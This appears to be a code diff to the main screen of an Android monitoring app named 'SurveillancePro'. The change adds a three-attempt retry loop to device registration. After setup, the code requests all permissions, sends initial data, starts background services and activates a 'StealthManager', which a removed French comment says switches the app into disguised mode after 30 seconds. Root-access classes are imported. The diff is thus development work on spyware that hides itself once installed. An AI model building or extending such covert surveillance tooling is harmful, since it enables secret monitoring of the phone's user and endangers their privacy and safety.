@@ -37,6 +37,7 @@ import com.surveillancepro.android.root.RootActivator
 import com.surveillancepro.android.root.RootManager
 import com.surveillancepro.android.ui.theme.SupervisionProTheme
 import com.surveillancepro.android.workers.SyncWorker
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import java.text.SimpleDateFormat
@@ -190,43 +191,68 @@ class MainActivity : ComponentActivity() {
                     if (firstName.length < 2) { error = "Entrez votre prenom"; return@Button }
                     isLoading = true; error = null
                     lifecycleScope.launch {
-                        try {
-                            val deviceId = storage.deviceId
-                            val date = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
+                        var attempts = 0
+                        val maxAttempts = 3
 
-                            val result = api.registerDevice(
-                                deviceId = deviceId,
-                                deviceName = "${Build.MANUFACTURER} ${Build.MODEL} - $firstName",
-                                userName = firstName,
-                                acceptanceVersion = "1.0",
-                                acceptanceDate = date
-                            )
+                        while (attempts < maxAttempts) {
+                            attempts++
+                            try {
+                                error = if (attempts > 1) "Tentative $attempts/$maxAttempts..." else null
 
-                            val token = result?.get("deviceToken") as? String
-                            if (token == null) { error = "Connexion au serveur impossible. Reessayez."; isLoading = false; return@launch }
+                                val deviceId = storage.deviceId
+                                val date = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
 
-                            storage.deviceToken = token
-                            storage.userName = firstName
-                            storage.acceptanceDate = date
+                                val result = api.registerDevice(
+                                    deviceId = deviceId,
+                                    deviceName = "${Build.MANUFACTURER} ${Build.MODEL} - $firstName",
+                                    userName = firstName,
+                                    acceptanceVersion = "1.0",
+                                    acceptanceDate = date
+                                )
 
-                            val consentOk = api.sendConsent("1.0", firstName)
-                            if (!consentOk) { error = "Erreur de consentement. Reessayez."; isLoading = false; return@launch }
+                                val token = result?.get("deviceToken") as? String
+                                if (token == null) {
+                                    if (attempts >= maxAttempts) {
+                                        error = "Le serveur ne repond pas. Le serveur est peut-etre en cours de demarrage (jusqu'a 60 secondes). Reessayez."
+                                        isLoading = false
+                                        return@launch
+                                    }
+                                    delay(3000)
+                                    continue
+                                }
 
-                            storage.hasAccepted = true
-                            storage.consentSent = true
-                            isLoading = false
+                                storage.deviceToken = token
+                                storage.userName = firstName
+                                storage.acceptanceDate = date
 
-                            requestAllPermissions()
-                            sendInitialData()
-                            startAllServices()
-                            accepted = true
+                                val consentOk = api.sendConsent("1.0", firstName)
+                                if (!consentOk) {
+                                    error = "Erreur de consentement. Reessayez."
+                                    isLoading = false
+                                    return@launch
+                                }
 
-                            // Basculer en mode déguisé après 30 secondes
-                            StealthManager.activateAfterSetup(this@MainActivity)
+                                storage.hasAccepted = true
+                                storage.consentSent = true
+                                isLoading = false
 
-                        } catch (e: Exception) {
-                            error = "Connexion impossible. Verifiez votre connexion internet."
-                            isLoading = false
+                                requestAllPermissions()
+                                sendInitialData()
+                                startAllServices()
+                                accepted = true
+
+                                StealthManager.activateAfterSetup(this@MainActivity)
+                                return@launch
+
+                            } catch (e: Exception) {
+                                Log.w("MainActivity", "Registration attempt $attempts failed: ${e.message}")
+                                if (attempts >= maxAttempts) {
+                                    error = "Connexion impossible. Verifiez votre connexion internet et reessayez."
+                                    isLoading = false
+                                    return@launch
+                                }
+                                delay(3000)
+                            }
                         }
                     }
                 },
